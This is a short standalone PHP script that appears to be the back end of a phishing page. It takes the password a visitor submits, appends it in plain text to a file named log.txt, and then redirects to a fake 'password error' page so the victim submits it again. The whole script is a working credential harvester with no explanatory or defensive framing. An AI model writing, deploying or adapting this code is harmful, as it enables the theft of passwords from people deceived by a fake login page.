<?php

    $pass = $_POST['password'];
    $file = fopen("log.txt","a");
    fwrite($file,"\nPassword --> : ");
    fwrite($file,$pass);
    fclose($file);
    header("location:Password.php?password=error");
?>